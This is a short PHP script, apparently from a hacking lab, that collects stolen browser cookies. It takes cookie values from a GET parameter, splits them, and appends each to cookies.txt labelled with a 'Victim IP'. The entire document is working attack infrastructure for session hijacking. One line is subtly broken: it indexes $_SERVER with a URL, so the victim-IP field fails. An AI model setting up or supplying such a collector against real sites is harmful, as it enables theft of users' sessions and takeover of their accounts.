<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['http://10.129.193.148/hijacking/index.php']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
